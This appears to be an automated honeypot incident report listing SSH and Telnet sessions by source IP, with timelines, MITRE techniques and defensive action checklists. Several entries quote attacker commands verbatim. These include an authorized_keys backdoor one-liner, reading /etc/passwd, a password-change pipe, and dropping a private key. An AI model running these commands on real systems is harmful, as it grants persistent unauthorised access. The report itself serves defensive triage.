
**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:01:37` | `cowrie.session.connect` |
| `2026-08-26 17:01:37` | `cowrie.client.version` |
| `2026-08-26 17:01:38` | `cowrie.client.kex` |
| `2026-08-26 17:01:38` | `cowrie.login.success` |
| `2026-08-26 17:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65d8ce50a2d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-26 17:01 |
| **Last Seen** | 2026-08-26 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:01:37` | `cowrie.session.connect` |
| `2026-08-26 17:01:37` | `cowrie.client.version` |
| `2026-08-26 17:01:38` | `cowrie.client.kex` |
| `2026-08-26 17:01:38` | `cowrie.login.success` |
| `2026-08-26 17:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74963687887

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-26 17:04 |
| **Last Seen** | 2026-08-26 17:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:04:29` | `cowrie.session.connect` |
| `2026-08-26 17:04:29` | `cowrie.client.version` |
| `2026-08-26 17:04:29` | `cowrie.client.kex` |
| `2026-08-26 17:04:29` | `cowrie.login.success` |
| `2026-08-26 17:04:29` | `cowrie.direct-tcpip.request` |
| `2026-08-26 17:04:29` | `cowrie.direct-tcpip.data` |
| `2026-08-26 17:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed8374095fce

| Field | Detail |
|---|---|
| **Source IP** | `27.221.13[.]7` |
| **First Seen** | 2026-08-26 17:19 |
| **Last Seen** | 2026-08-26 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:19:45` | `cowrie.session.connect` |
| `2026-08-26 17:19:45` | `cowrie.client.version` |
| `2026-08-26 17:19:45` | `cowrie.client.kex` |
| `2026-08-26 17:19:46` | `cowrie.login.success` |
| `2026-08-26 17:19:47` | `cowrie.session.params` |
| `2026-08-26 17:19:47` | `cowrie.command.input` |
| `2026-08-26 17:19:47` | `cowrie.log.closed` |
| `2026-08-26 17:19:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.221.13[.]7` to AbuseIPDB if not already reported
- [ ] Block `27.221.13[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51970f81df1f

| Field | Detail |
|---|---|
| **Source IP** | `23.95.18[.]196` |
| **First Seen** | 2026-08-26 17:19 |
| **Last Seen** | 2026-08-26 17:20 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:19:47` | `cowrie.session.connect` |
| `2026-08-26 17:19:50` | `cowrie.client.version` |
| `2026-08-26 17:19:50` | `cowrie.client.kex` |
| `2026-08-26 17:20:09` | `cowrie.login.success` |
| `2026-08-26 17:20:30` | `cowrie.session.params` |
| `2026-08-26 17:20:30` | `cowrie.command.input` |
| `2026-08-26 17:20:33` | `cowrie.log.closed` |
| `2026-08-26 17:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.95.18[.]196` to AbuseIPDB if not already reported
- [ ] Block `23.95.18[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a80b6cb560a0

| Field | Detail |
|---|---|
| **Source IP** | `47.77.189[.]39` |
| **First Seen** | 2026-08-26 17:35 |
| **Last Seen** | 2026-08-26 17:36 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:35:10` | `cowrie.session.connect` |
| `2026-08-26 17:35:11` | `cowrie.telnet.option` |
| `2026-08-26 17:35:11` | `cowrie.telnet.option` |
| `2026-08-26 17:35:11` | `cowrie.login.success` |
| `2026-08-26 17:35:11` | `cowrie.session.params` |
| `2026-08-26 17:35:11` | `cowrie.telnet.option` |
| `2026-08-26 17:35:11` | `cowrie.telnet.option` |
| `2026-08-26 17:35:11` | `cowrie.command.input` |
| `2026-08-26 17:35:11` | `cowrie.command.input` |
| `2026-08-26 17:35:11` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.failed` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:35:12` | `cowrie.command.input` |
| `2026-08-26 17:36:12` | `cowrie.log.closed` |
| `2026-08-26 17:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.189[.]39` to AbuseIPDB if not already reported
- [ ] Block `47.77.189[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd1526fb6fd

| Field | Detail |
|---|---|
| **Source IP** | `108.175.5[.]23` |
| **First Seen** | 2026-08-26 17:44 |
| **Last Seen** | 2026-08-26 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:44:23` | `cowrie.session.connect` |
| `2026-08-26 17:44:23` | `cowrie.client.version` |
| `2026-08-26 17:44:23` | `cowrie.client.kex` |
| `2026-08-26 17:44:23` | `cowrie.login.success` |
| `2026-08-26 17:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.175.5[.]23` to AbuseIPDB if not already reported
- [ ] Block `108.175.5[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-037faab5c44b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-26 17:44 |
| **Last Seen** | 2026-08-26 17:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 17:44:23` | `cowrie.session.connect` |
| `2026-08-26 17:44:23` | `cowrie.client.version` |
| `2026-08-26 17:44:23` | `cowrie.client.kex` |
| `2026-08-26 17:44:23` | `cowrie.login.success` |
| `2026-08-26 17:44:25` | `cowrie.session.params` |
| `2026-08-26 17:44:25` | `cowrie.command.input` |
| `2026-08-26 17:44:25` | `cowrie.session.file_download` |
| `2026-08-26 17:44:25` | `cowrie.session.file_download` |
| `2026-08-26 17:44:25` | `cowrie.log.closed` |
| `2026-08-26 17:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34ffb19da0b

| Field | Detail |
|---|---|
| **Source IP** | `219.140.105[.]152` |
| **First Seen** | 2026-08-26 18:08 |
| **Last Seen** | 2026-08-26 18:09 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:08:42` | `cowrie.session.connect` |
| `2026-08-26 18:08:47` | `cowrie.client.version` |
| `2026-08-26 18:08:47` | `cowrie.client.kex` |
| `2026-08-26 18:09:11` | `cowrie.login.success` |
| `2026-08-26 18:09:21` | `cowrie.session.params` |
| `2026-08-26 18:09:21` | `cowrie.command.input` |
| `2026-08-26 18:09:26` | `cowrie.log.closed` |
| `2026-08-26 18:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.140.105[.]152` to AbuseIPDB if not already reported
- [ ] Block `219.140.105[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d3d6f4b83f

| Field | Detail |
|---|---|
| **Source IP** | `177.85.247[.]230` |
| **First Seen** | 2026-08-26 18:19 |
| **Last Seen** | 2026-08-26 18:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:19:37` | `cowrie.session.connect` |
| `2026-08-26 18:19:37` | `cowrie.client.version` |
| `2026-08-26 18:19:38` | `cowrie.client.kex` |
| `2026-08-26 18:19:38` | `cowrie.login.success` |
| `2026-08-26 18:19:39` | `cowrie.session.params` |
| `2026-08-26 18:19:39` | `cowrie.command.input` |
| `2026-08-26 18:19:39` | `cowrie.command.failed` |
| `2026-08-26 18:19:39` | `cowrie.log.closed` |
| `2026-08-26 18:19:40` | `cowrie.session.params` |
| `2026-08-26 18:19:40` | `cowrie.command.input` |
| `2026-08-26 18:19:40` | `cowrie.session.file_download` |
| `2026-08-26 18:19:40` | `cowrie.log.closed` |
| `2026-08-26 18:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.85.247[.]230` to AbuseIPDB if not already reported
- [ ] Block `177.85.247[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-215b3e813fc6

| Field | Detail |
|---|---|
| **Source IP** | `177.85.247[.]230` |
| **First Seen** | 2026-08-26 18:19 |
| **Last Seen** | 2026-08-26 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:19:40` | `cowrie.session.connect` |
| `2026-08-26 18:19:40` | `cowrie.client.version` |
| `2026-08-26 18:19:40` | `cowrie.client.kex` |
| `2026-08-26 18:19:41` | `cowrie.login.success` |
| `2026-08-26 18:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.85.247[.]230` to AbuseIPDB if not already reported
- [ ] Block `177.85.247[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a8b88e1109

| Field | Detail |
|---|---|
| **Source IP** | `177.85.247[.]230` |
| **First Seen** | 2026-08-26 18:19 |
| **Last Seen** | 2026-08-26 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:19:41` | `cowrie.session.connect` |
| `2026-08-26 18:19:41` | `cowrie.client.version` |
| `2026-08-26 18:19:41` | `cowrie.client.kex` |
| `2026-08-26 18:19:42` | `cowrie.login.success` |
| `2026-08-26 18:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.85.247[.]230` to AbuseIPDB if not already reported
- [ ] Block `177.85.247[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3924ce3a1d4c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-26 18:20 |
| **Last Seen** | 2026-08-26 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:20:25` | `cowrie.session.connect` |
| `2026-08-26 18:20:26` | `cowrie.client.version` |
| `2026-08-26 18:20:26` | `cowrie.client.kex` |
| `2026-08-26 18:20:26` | `cowrie.login.success` |
| `2026-08-26 18:20:26` | `cowrie.direct-tcpip.request` |
| `2026-08-26 18:20:26` | `cowrie.direct-tcpip.data` |
| `2026-08-26 18:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8352ec7252a7

| Field | Detail |
|---|---|
| **Source IP** | `101.126.71[.]100` |
| **First Seen** | 2026-08-26 18:27 |
| **Last Seen** | 2026-08-26 18:27 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "new\n0gvy2vmtAFDG\n0gvy2vmtAFDG"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:27:07` | `cowrie.session.connect` |
| `2026-08-26 18:27:08` | `cowrie.client.version` |
| `2026-08-26 18:27:08` | `cowrie.client.kex` |
| `2026-08-26 18:27:09` | `cowrie.login.success` |
| `2026-08-26 18:27:10` | `cowrie.session.params` |
| `2026-08-26 18:27:10` | `cowrie.command.input` |
| `2026-08-26 18:27:10` | `cowrie.command.failed` |
| `2026-08-26 18:27:10` | `cowrie.log.closed` |
| `2026-08-26 18:27:11` | `cowrie.session.params` |
| `2026-08-26 18:27:11` | `cowrie.command.input` |
| `2026-08-26 18:27:11` | `cowrie.session.file_download` |
| `2026-08-26 18:27:11` | `cowrie.log.closed` |
| `2026-08-26 18:27:28` | `cowrie.session.params` |
| `2026-08-26 18:27:28` | `cowrie.command.input` |
| `2026-08-26 18:27:28` | `cowrie.log.closed` |
| `2026-08-26 18:27:29` | `cowrie.session.params` |
| `2026-08-26 18:27:29` | `cowrie.command.input` |
| `2026-08-26 18:27:29` | `cowrie.command.input` |
| `2026-08-26 18:27:29` | `cowrie.command.failed` |
| `2026-08-26 18:27:30` | `cowrie.log.closed` |
| `2026-08-26 18:27:31` | `cowrie.session.params` |
| `2026-08-26 18:27:31` | `cowrie.command.input` |
| `2026-08-26 18:27:31` | `cowrie.log.closed` |
| `2026-08-26 18:27:32` | `cowrie.session.params` |
| `2026-08-26 18:27:32` | `cowrie.command.input` |
| `2026-08-26 18:27:32` | `cowrie.log.closed` |
| `2026-08-26 18:27:33` | `cowrie.session.params` |
| `2026-08-26 18:27:33` | `cowrie.command.input` |
| `2026-08-26 18:27:34` | `cowrie.log.closed` |
| `2026-08-26 18:27:35` | `cowrie.session.params` |
| `2026-08-26 18:27:35` | `cowrie.command.input` |
| `2026-08-26 18:27:35` | `cowrie.command.input` |
| `2026-08-26 18:27:35` | `cowrie.log.closed` |
| `2026-08-26 18:27:36` | `cowrie.session.params` |
| `2026-08-26 18:27:36` | `cowrie.command.input` |
| `2026-08-26 18:27:36` | `cowrie.log.closed` |
| `2026-08-26 18:27:37` | `cowrie.session.params` |
| `2026-08-26 18:27:37` | `cowrie.command.input` |
| `2026-08-26 18:27:37` | `cowrie.log.closed` |
| `2026-08-26 18:27:39` | `cowrie.session.params` |
| `2026-08-26 18:27:39` | `cowrie.command.input` |
| `2026-08-26 18:27:39` | `cowrie.log.closed` |
| `2026-08-26 18:27:40` | `cowrie.session.params` |
| `2026-08-26 18:27:40` | `cowrie.command.input` |
| `2026-08-26 18:27:40` | `cowrie.log.closed` |
| `2026-08-26 18:27:41` | `cowrie.session.params` |
| `2026-08-26 18:27:41` | `cowrie.command.input` |
| `2026-08-26 18:27:41` | `cowrie.log.closed` |
| `2026-08-26 18:27:42` | `cowrie.session.params` |
| `2026-08-26 18:27:42` | `cowrie.command.input` |
| `2026-08-26 18:27:43` | `cowrie.log.closed` |
| `2026-08-26 18:27:44` | `cowrie.session.params` |
| `2026-08-26 18:27:44` | `cowrie.command.input` |
| `2026-08-26 18:27:44` | `cowrie.log.closed` |
| `2026-08-26 18:27:45` | `cowrie.session.params` |
| `2026-08-26 18:27:45` | `cowrie.command.input` |
| `2026-08-26 18:27:45` | `cowrie.log.closed` |
| `2026-08-26 18:27:46` | `cowrie.session.params` |
| `2026-08-26 18:27:46` | `cowrie.command.input` |
| `2026-08-26 18:27:46` | `cowrie.log.closed` |
| `2026-08-26 18:27:48` | `cowrie.session.params` |
| `2026-08-26 18:27:48` | `cowrie.command.input` |
| `2026-08-26 18:27:48` | `cowrie.log.closed` |
| `2026-08-26 18:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.71[.]100` to AbuseIPDB if not already reported
- [ ] Block `101.126.71[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92064770d0b3

| Field | Detail |
|---|---|
| **Source IP** | `117.50.70[.]169` |
| **First Seen** | 2026-08-26 18:27 |
| **Last Seen** | 2026-08-26 18:32 |
| **Session Duration** | 251s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 18:27:57` | `cowrie.session.connect` |
| `2026-08-26 18:27:57` | `cowrie.client.version` |
| `2026-08-26 18:27:57` | `cowrie.client.kex` |
| `2026-08-26 18:27:58` | `cowrie.login.success` |
| `2026-08-26 18:27:59` | `cowrie.session.params` |
| `2026-08-26 18:27:59` | `cowrie.command.input` |
| `2026-08-26 18:27:59` | `cowrie.command.failed` |
| `2026-08-26 18:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.70[.]169` to AbuseIPDB if not already reported
- [ ] Block `117.50.70[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.37.220[.]188` | **16** | 2026-08-26 15:03 | 2026-08-26 18:19 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-08-26 15:04 | 2026-08-26 18:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.116.129[.]132` | **3** | 2026-08-26 15:02 | 2026-08-26 16:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-08-26 15:03 | 2026-08-26 18:02 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]46` | **3** | 2026-08-26 14:58 | 2026-08-26 14:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]112` | **3** | 2026-08-26 14:59 | 2026-08-26 15:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]225` | **3** | 2026-08-26 14:59 | 2026-08-26 14:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.100.95[.]30` | **3** | 2026-08-26 17:06 | 2026-08-26 17:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.71[.]100` | **2** | 2026-08-26 18:27 | 2026-08-26 18:27 | 1m | 0 | `T1592` | 🟢 LOW |
| `154.60.106[.]190` | **2** | 2026-08-26 16:09 | 2026-08-26 16:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.185[.]115` | **2** | 2026-08-26 16:40 | 2026-08-26 16:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `201.187.69[.]3` | **2** | 2026-08-26 17:14 | 2026-08-26 17:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.219.32[.]239` | 1 | 2026-08-26 16:00 | 2026-08-26 16:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.160.67[.]73` | 1 | 2026-08-26 16:11 | 2026-08-26 16:11 | 31s | 0 | `T1592` | 🟢 LOW |
| `117.50.73[.]90` | 1 | 2026-08-26 15:08 | 2026-08-26 15:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.116.157[.]181` | 1 | 2026-08-26 14:56 | 2026-08-26 14:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.40.125[.]184` | 1 | 2026-08-26 16:14 | 2026-08-26 16:14 | 31s | 0 | `T1592` | 🟢 LOW |
| `193.24.126[.]143` | 1 | 2026-08-26 18:47 | 2026-08-26 18:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | 1 | 2026-08-26 16:50 | 2026-08-26 16:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-08-26 14:59 | 2026-08-26 14:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.59.88[.]100` | 1 | 2026-08-26 18:02 | 2026-08-26 18:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]109` | 1 | 2026-08-26 15:05 | 2026-08-26 15:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `201.10.49[.]45` | 1 | 2026-08-26 17:02 | 2026-08-26 17:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `210.61.64[.]135` | 1 | 2026-08-26 18:53 | 2026-08-26 18:53 | 31s | 0 | `T1592` | 🟢 LOW |
| `216.244.199[.]249` | 1 | 2026-08-26 17:33 | 2026-08-26 17:33 | 10s | 0 | `T1592` | 🟢 LOW |
| `216.244.218[.]221` | 1 | 2026-08-26 18:17 | 2026-08-26 18:17 | 10s | 0 | `T1592` | 🟢 LOW |
| `219.140.105[.]152` | 1 | 2026-08-26 18:08 | 2026-08-26 18:08 | 4s | 0 | `T1592` | 🟢 LOW |
| `31.128.172[.]225` | 1 | 2026-08-26 15:01 | 2026-08-26 15:01 | 13s | 0 | `T1592` | 🟢 LOW |
| `31.41.94[.]249` | 1 | 2026-08-26 15:53 | 2026-08-26 15:53 | 12s | 0 | `T1592` | 🟢 LOW |
| `36.111.40[.]138` | 1 | 2026-08-26 15:04 | 2026-08-26 15:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.56.104[.]173` | 1 | 2026-08-26 18:23 | 2026-08-26 18:24 | 31s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-08-26 15:34 | 2026-08-26 15:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.210.198[.]27` | 1 | 2026-08-26 15:08 | 2026-08-26 15:09 | 31s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-08-26 16:06 | 2026-08-26 16:06 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-26 17:35 | 2026-08-26 17:35 | 0s | 0 | `T1592` | 🟢 LOW |
